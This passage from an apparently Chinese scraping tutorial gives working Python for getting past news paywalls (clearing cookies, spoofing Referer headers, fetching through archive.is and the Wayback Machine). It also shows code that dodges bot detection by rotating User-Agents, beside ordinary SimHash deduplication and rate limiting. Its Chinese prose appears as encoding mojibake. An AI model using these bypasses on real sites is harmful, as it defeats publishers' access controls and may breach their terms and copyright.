    <span class="k">return</span> <span class="n">article</span><span class="o">.</span><span class="n">get_text</span><span class="p">(</span><span class="n">strip</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span> <span class="k">if</span> <span class="n">article</span> <span class="k">else</span> <span class="kc">None</span>

<span class="c1"># ä½¿ç”¨ç¤ºä¾‹</span>
<span class="n">content</span> <span class="o">=</span> <span class="n">bypass_soft_paywall</span><span class="p">(</span><span class="s1">&#39;https://news.example.com/premium-article&#39;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="2-cookie-é™åˆ¶">2. Cookie é™åˆ¶</h4>

      <p>é™åˆ¶å…è´¹æ–‡ç« æ•°é‡ï¼ˆé€šè¿‡ Cookie è¿½è¸ªï¼‰:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="k">class</span><span class="w"> </span><span class="nc">PaywallBypass</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">clear_cookies</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ¸…é™¤ cookies é‡ç½®è®¡æ•°&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">use_incognito_headers</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ä½¿ç”¨éšèº«æ¨¡å¼è¯·æ±‚å¤´&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">update</span><span class="p">({</span>
            <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&#39;</span><span class="p">,</span>
            <span class="s1">&#39;Referer&#39;</span><span class="p">:</span> <span class="s1">&#39;https://www.google.com/&#39;</span><span class="p">,</span>
            <span class="s1">&#39;DNT&#39;</span><span class="p">:</span> <span class="s1">&#39;1&#39;</span>
        <span class="p">})</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_article</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è·å–æ–‡ç« ï¼ˆç»•è¿‡ cookie é™åˆ¶ï¼‰&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">clear_cookies</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">use_incognito_headers</span><span class="p">()</span>

        <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span>

<span class="c1"># ä½¿ç”¨ç¤ºä¾‹</span>
<span class="n">bypass</span> <span class="o">=</span> <span class="n">PaywallBypass</span><span class="p">()</span>
<span class="n">content</span> <span class="o">=</span> <span class="n">bypass</span><span class="o">.</span><span class="n">get_article</span><span class="p">(</span><span class="s1">&#39;https://news.example.com/article/123&#39;</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="3-googlefacebook-referrer-ç»•è¿‡">3. Google/Facebook Referrer ç»•è¿‡</h4>

      <p>æŸäº›ç½‘ç«™å…è®¸ä»æœç´¢å¼•æ“/ç¤¾äº¤åª’ä½“æ¥çš„æµé‡:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">bypass_with_referrer</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ä½¿ç”¨ Referrer ç»•è¿‡ä»˜è´¹å¢™&quot;&quot;&quot;</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&#39;</span><span class="p">,</span>
        <span class="s1">&#39;Referer&#39;</span><span class="p">:</span> <span class="s1">&#39;https://www.google.com/&#39;</span>  <span class="c1"># æˆ– &#39;https://t.co/&#39;</span>
    <span class="p">}</span>

    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span>

<span class="c1"># ä½¿ç”¨ç¤ºä¾‹</span>
<span class="n">content</span> <span class="o">=</span> <span class="n">bypass_with_referrer</span><span class="p">(</span><span class="s1">&#39;https://news.example.com/article/123&#39;</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="archiveis-web-archive-ç»•è¿‡">Archive.is / Web Archive ç»•è¿‡</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">urllib.parse</span><span class="w"> </span><span class="kn">import</span> <span class="n">quote</span>

<span class="k">class</span><span class="w"> </span><span class="nc">ArchiveBypass</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">archive_api</span> <span class="o">=</span> <span class="s2">&quot;https://archive.is/submit/&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">wayback_api</span> <span class="o">=</span> <span class="s2">&quot;https://web.archive.org/save/&quot;</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">archive_is</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ä½¿ç”¨ Archive.is å­˜æ¡£å¹¶è·å–å†…å®¹&quot;&quot;&quot;</span>
        <span class="c1"># æäº¤å­˜æ¡£è¯·æ±‚</span>
        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;url&#39;</span><span class="p">:</span> <span class="n">url</span><span class="p">}</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">archive_api</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>

        <span class="c1"># è·å–å­˜æ¡£ URL</span>
        <span class="n">archive_url</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;Location&#39;</span><span class="p">)</span>

        <span class="k">if</span> <span class="n">archive_url</span><span class="p">:</span>
            <span class="c1"># è·å–å­˜æ¡£å†…å®¹</span>
            <span class="n">archive_content</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">archive_url</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
            <span class="k">return</span> <span class="n">archive_content</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">return</span> <span class="kc">None</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">wayback_machine</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ä½¿ç”¨ Wayback Machine&quot;&quot;&quot;</span>
        <span class="c1"># ä¿å­˜å¿«ç…§</span>
        <span class="n">save_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">wayback_api</span><span class="si">}{</span><span class="n">url</span><span class="si">}</span><span class="s2">&quot;</span>
        <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">save_url</span><span class="p">)</span>

        <span class="c1"># è·å–æœ€æ–°å¿«ç…§</span>
        <span class="n">snapshot_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;https://web.archive.org/web/</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2">&quot;</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">snapshot_url</span><span class="p">)</span>

        <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span>

<span class="c1"># ä½¿ç”¨ç¤ºä¾‹</span>
<span class="n">bypass</span> <span class="o">=</span> <span class="n">ArchiveBypass</span><span class="p">()</span>
<span class="n">content</span> <span class="o">=</span> <span class="n">bypass</span><span class="o">.</span><span class="n">archive_is</span><span class="p">(</span><span class="s1">&#39;https://news.example.com/premium-article&#39;</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ¡ˆä¾‹-5-åçˆ¬è™«å¯¹æŠ—ä¸å†…å®¹å»é‡">æ¡ˆä¾‹ 5: åçˆ¬è™«å¯¹æŠ—ä¸å†…å®¹å»é‡</h2>

      <h3 id="èƒŒæ™¯-5">èƒŒæ™¯</h3>

      <p>æ–°é—»èšåˆç½‘ç«™éœ€è¦å¤„ç†å¤§é‡å†…å®¹ï¼ŒåŒæ—¶é¿å…è¢«æºç½‘ç«™å°ç¦ã€‚</p>

      <h3 id="user-agent-è½®æ¢">User-Agent è½®æ¢</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">random</span>

<span class="k">class</span><span class="w"> </span><span class="nc">UserAgentRotator</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">user_agents</span> <span class="o">=</span> <span class="p">[</span>
            <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&#39;</span><span class="p">,</span>
            <span class="s1">&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36&#39;</span><span class="p">,</span>
            <span class="s1">&#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36&#39;</span><span class="p">,</span>
            <span class="s1">&#39;Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15&#39;</span><span class="p">,</span>
            <span class="s1">&#39;Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15&#39;</span>
        <span class="p">]</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_random_ua</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è·å–éšæœº User-Agent&quot;&quot;&quot;</span>
        <span class="k">return</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">user_agents</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">make_request</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ä½¿ç”¨éšæœº UA å‘é€è¯·æ±‚&quot;&quot;&quot;</span>
        <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_random_ua</span><span class="p">()}</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span>
</code></pre>
      </div>

      <h3 id="å†…å®¹å»é‡simhash">å†…å®¹å»é‡ï¼ˆSimHashï¼‰</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">collections</span><span class="w"> </span><span class="kn">import</span> <span class="n">defaultdict</span>

<span class="k">class</span><span class="w"> </span><span class="nc">ContentDeduplicator</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">threshold</span><span class="o">=</span><span class="mi">3</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">        threshold: æ±‰æ˜è·ç¦»é˜ˆå€¼ï¼ˆè¶Šå°è¶Šä¸¥æ ¼ï¼‰</span>
<span class="sd">        &quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">threshold</span> <span class="o">=</span> <span class="n">threshold</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">seen_hashes</span> <span class="o">=</span> <span class="p">{}</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">simhash</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">text</span><span class="p">,</span> <span class="n">hashbits</span><span class="o">=</span><span class="mi">64</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è®¡ç®—æ–‡æœ¬çš„ SimHash&quot;&quot;&quot;</span>
        <span class="c1"># åˆ†è¯ï¼ˆç®€åŒ–ç‰ˆæœ¬ï¼‰</span>
        <span class="n">tokens</span> <span class="o">=</span> <span class="n">text</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>

        <span class="c1"># è¯é¢‘ç»Ÿè®¡</span>
        <span class="n">freq</span> <span class="o">=</span> <span class="n">defaultdict</span><span class="p">(</span><span class="nb">int</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">token</span> <span class="ow">in</span> <span class="n">tokens</span><span class="p">:</span>
            <span class="n">freq</span><span class="p">[</span><span class="n">token</span><span class="p">]</span> <span class="o">+=</span> <span class="mi">1</span>

        <span class="c1"># åˆå§‹åŒ–å‘é‡</span>
        <span class="n">vector</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="n">hashbits</span>

        <span class="k">for</span> <span class="n">token</span><span class="p">,</span> <span class="n">weight</span> <span class="ow">in</span> <span class="n">freq</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
            <span class="c1"># è®¡ç®— token çš„ hash</span>
            <span class="n">h</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">token</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>

            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">hashbits</span><span class="p">):</span>
                <span class="c1"># æ£€æŸ¥ç¬¬ i ä½æ˜¯å¦ä¸º 1</span>
                <span class="k">if</span> <span class="n">h</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">i</span><span class="p">):</span>
                    <span class="n">vector</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+=</span> <span class="n">weight</span>
                <span class="k">else</span><span class="p">:</span>
                    <span class="n">vector</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-=</span> <span class="n">weight</span>

        <span class="c1"># ç”Ÿæˆ SimHash</span>
        <span class="n">fingerprint</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">hashbits</span><span class="p">):</span>
            <span class="k">if</span> <span class="n">vector</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
                <span class="n">fingerprint</span> <span class="o">|=</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">i</span><span class="p">)</span>

        <span class="k">return</span> <span class="n">fingerprint</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">hamming_distance</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">hash1</span><span class="p">,</span> <span class="n">hash2</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è®¡ç®—æ±‰æ˜è·ç¦»&quot;&quot;&quot;</span>
        <span class="n">x</span> <span class="o">=</span> <span class="n">hash1</span> <span class="o">^</span> <span class="n">hash2</span>
        <span class="n">distance</span> <span class="o">=</span> <span class="mi">0</span>

        <span class="k">while</span> <span class="n">x</span><span class="p">:</span>
            <span class="n">distance</span> <span class="o">+=</span> <span class="mi">1</span>
            <span class="n">x</span> <span class="o">&amp;=</span> <span class="n">x</span> <span class="o">-</span> <span class="mi">1</span>

        <span class="k">return</span> <span class="n">distance</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">is_duplicate</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">text</span><span class="p">,</span> <span class="n">article_id</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ£€æŸ¥æ–‡ç« æ˜¯å¦é‡å¤&quot;&quot;&quot;</span>
        <span class="n">fingerprint</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">simhash</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>

        <span class="c1"># æ£€æŸ¥æ˜¯å¦ä¸å·²å­˜åœ¨çš„æ–‡ç« ç›¸ä¼¼</span>
        <span class="k">for</span> <span class="n">existing_id</span><span class="p">,</span> <span class="n">existing_hash</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">seen_hashes</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
            <span class="n">distance</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">hamming_distance</span><span class="p">(</span><span class="n">fingerprint</span><span class="p">,</span> <span class="n">existing_hash</span><span class="p">)</span>

            <span class="k">if</span> <span class="n">distance</span> <span class="o">&lt;=</span> <span class="bp">self</span><span class="o">.</span><span class="n">threshold</span><span class="p">:</span>
                <span class="k">return</span> <span class="kc">True</span><span class="p">,</span> <span class="n">existing_id</span>

        <span class="c1"># ä¿å­˜æ–°æ–‡ç« çš„ hash</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">seen_hashes</span><span class="p">[</span><span class="n">article_id</span><span class="p">]</span> <span class="o">=</span> <span class="n">fingerprint</span>

        <span class="k">return</span> <span class="kc">False</span><span class="p">,</span> <span class="kc">None</span>

<span class="c1"># ä½¿ç”¨ç¤ºä¾‹</span>
<span class="n">dedup</span> <span class="o">=</span> <span class="n">ContentDeduplicator</span><span class="p">(</span><span class="n">threshold</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>

<span class="n">articles</span> <span class="o">=</span> <span class="p">[</span>
    <span class="p">{</span><span class="s1">&#39;id&#39;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;text&#39;</span><span class="p">:</span> <span class="s1">&#39;Breaking news: AI makes major breakthrough in language processing&#39;</span><span class="p">},</span>
    <span class="p">{</span><span class="s1">&#39;id&#39;</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span> <span class="s1">&#39;text&#39;</span><span class="p">:</span> <span class="s1">&#39;Breaking news: AI makes significant breakthrough in language processing&#39;</span><span class="p">},</span>
    <span class="p">{</span><span class="s1">&#39;id&#39;</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span> <span class="s1">&#39;text&#39;</span><span class="p">:</span> <span class="s1">&#39;Weather forecast shows sunny skies ahead&#39;</span><span class="p">},</span>
<span class="p">]</span>

<span class="k">for</span> <span class="n">article</span> <span class="ow">in</span> <span class="n">articles</span><span class="p">:</span>
    <span class="n">is_dup</span><span class="p">,</span> <span class="n">original_id</span> <span class="o">=</span> <span class="n">dedup</span><span class="o">.</span><span class="n">is_duplicate</span><span class="p">(</span><span class="n">article</span><span class="p">[</span><span class="s1">&#39;text&#39;</span><span class="p">],</span> <span class="n">article</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">])</span>

    <span class="k">if</span> <span class="n">is_dup</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Article </span><span class="si">{</span><span class="n">article</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2"> is duplicate of </span><span class="si">{</span><span class="n">original_id</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Article </span><span class="si">{</span><span class="n">article</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2"> is unique&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="æ™ºèƒ½é™æµ">æ™ºèƒ½é™æµ</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">collections</span><span class="w"> </span><span class="kn">import</span> <span class="n">deque</span>

<span class="k">class</span><span class="w"> </span><span class="nc">RateLimiter</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">max_requests</span><span class="p">,</span> <span class="n">time_window</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">        max_requests: æ—¶é—´çª—å£å†…çš„æœ€å¤§è¯·æ±‚æ•°</span>
<span class="sd">        time_window: æ—¶é—´çª—å£ï¼ˆç§’ï¼‰</span>
<span class="sd">        &quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">max_requests</span> <span class="o">=</span> <span class="n">max_requests</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">time_window</span> <span class="o">=</span> <span class="n">time_window</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">requests</span> <span class="o">=</span> <span class="n">deque</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">wait_if_needed</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;å¦‚æœéœ€è¦ï¼Œç­‰å¾…ç›´åˆ°å¯ä»¥å‘é€è¯·æ±‚&quot;&quot;&quot;</span>
        <span class="n">now</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>

        <span class="c1"># ç§»é™¤è¶…å‡ºæ—¶é—´çª—å£çš„è¯·æ±‚</span>
        <span class="k">while</span> <span class="bp">self</span><span class="o">.</span><span class="n">requests</span> <span class="ow">and</span> <span class="bp">self</span><span class="o">.</span><span class="n">requests</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">now</span> <span class="o">-</span> <span class="bp">self</span><span class="o">.</span><span class="n">time_window</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">requests</span><span class="o">.</span><span class="n">popleft</span><span class="p">()</span>

        <span class="c1"># å¦‚æœè¾¾åˆ°é™åˆ¶ï¼Œç­‰å¾…</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">requests</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="bp">self</span><span class="o">.</span><span class="n">max_requests</span><span class="p">:</span>
            <span class="n">sleep_time</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">requests</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">time_window</span> <span class="o">-</span> <span class="n">now</span>
            <span class="k">if</span> <span class="n">sleep_time</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Rate limit reached, waiting </span><span class="si">{</span><span class="n">sleep_time</span><span class="si">:</span><span class="s2">.2f</span><span class="si">}</span><span class="s2"> seconds...&quot;</span><span class="p">)</span>
                <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">sleep_time</span><span class="p">)</span>

        <span class="c1"># è®°å½•æœ¬æ¬¡è¯·æ±‚</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">requests</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">request</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;å‘é€å—é™æµæ§åˆ¶çš„è¯·æ±‚&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">wait_if_needed</span><span class="p">()</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">response</span>

<span class="c1"># ä½¿ç”¨ç¤ºä¾‹</span>
<span class="n">limiter</span> <span class="o">=</span> <span class="n">RateLimiter</span><span class="p">(</span><span class="n">max_requests</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span> <span class="n">time_window</span><span class="o">=</span><span class="mi">60</span><span class="p">)</span>  <span class="c1"># æ¯åˆ†é’Ÿæœ€å¤š 10 æ¬¡</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">20</span><span class="p">):</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">limiter</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;https://news.example.com/article/</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Fetched article </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="é˜²æŠ¤ä¸å¯¹æŠ—æ€»ç»“">é˜²æŠ¤ä¸å¯¹æŠ—æ€»ç»“</h2>

      <h3 id="æ–°é—»èšåˆå¹³å°é˜²æŠ¤">æ–°é—»èšåˆå¹³å°é˜²æŠ¤</h3>

      <ol>
        <li><strong>ä»˜è´¹å¢™</strong>: JavaScript éšè—ã€Cookie é™åˆ¶ã€è®¢é˜…éªŒè¯</li>
        <li><strong>åçˆ¬è™«</strong>: User-Agent æ£€æµ‹ã€é¢‘ç‡é™åˆ¶ã€CAPTCHA</li>
        <li><strong>å†…å®¹ä¿æŠ¤</strong>: åè°ƒè¯•ã€æ··æ·†ã€æ°´å°</li>
        <li><strong>API é™æµ</strong>: Token éªŒè¯ã€IP é™åˆ¶</li>
        <li><strong>ç‰ˆæƒä¿æŠ¤</strong>: DMCA é€šçŸ¥ã€æ³•å¾‹è¡ŒåŠ¨</li>
      </ol>

      <h3 id="å¯¹æŠ—ç­–ç•¥">å¯¹æŠ—ç­–ç•¥</h3>

      <ol>
        <li><strong>ä»˜è´¹å¢™ç»•è¿‡</strong>: Referrer æ¬ºéª—ã€Archive å­˜æ¡£ã€æµè§ˆå™¨æ‰©å±•</li>
        <li><strong>æ™ºèƒ½çˆ¬å–</strong>: UA è½®æ¢ã€ä»£ç†æ± ã€å»¶è¿Ÿæ§åˆ¶</li>
        <li><strong>å†…å®¹æå–</strong>: newspaper3kã€Readabilityã€è‡ªå®šä¹‰è§£æå™¨</li>
        <li><strong>å»é‡ç®—æ³•</strong>: SimHashã€MinHashã€LSH</li>
        <li><strong>åˆ†å¸ƒå¼é‡‡é›†</strong>: å¤šèŠ‚ç‚¹ã€ä»»åŠ¡é˜Ÿåˆ—ã€å¢é‡æ›´æ–°</li>
      </ol>

      <hr />

      <h2 id="æ³•å¾‹ä¸é“å¾·å£°æ˜">æ³•å¾‹ä¸é“å¾·å£°æ˜</h2>

      <p><strong>æœ¬æ–‡ä»…ç”¨äºæŠ€æœ¯ç ”ç©¶å’Œæ•™è‚²ç›®çš„</strong>ã€‚æœªç»æˆæƒçˆ¬å–å’Œç»•è¿‡ä»˜è´¹å¢™å¯èƒ½è¿å:</p>

      <ul>
        <li>ç½‘ç«™æœåŠ¡æ¡æ¬¾ (ToS)</li>
        <li>ç‰ˆæƒæ³• (Copyright Law)</li>
        <li>è®¡ç®—æœºæ¬ºè¯ˆå’Œæ»¥ç”¨æ³• (CFAA)</li>
        <li>æ•°å­—åƒå¹´ç‰ˆæƒæ³• (DMCA)</li>
      </ul>

